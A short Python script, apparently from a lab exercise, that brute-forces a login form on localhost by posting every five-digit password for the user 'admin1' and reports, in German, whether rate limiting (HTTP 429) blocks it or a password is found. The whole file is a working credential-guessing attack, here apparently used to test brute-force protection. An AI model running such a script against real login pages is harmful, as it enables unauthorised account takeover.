import requests

URL = "http://localhost:5000/"

USERNAME = "admin1"

for i in range(100000):

    password = f"{i:05d}"

    response = requests.post(
        URL,
        data={
            "username": USERNAME,
            "password": password
        }
    )

    if response.status_code == 429:
        print("\nBrute-Force blockiert (HTTP 429).")
        print("Der Login wurde nach zu vielen Fehlversuchen gesperrt.")
        break

    if response.status_code == 200:
        print(f"\nPassword gefunden: {password}")
        print(response.text)
        break

    if i % 1000 == 0:
        print(f"wurden {i} passwords getestet...")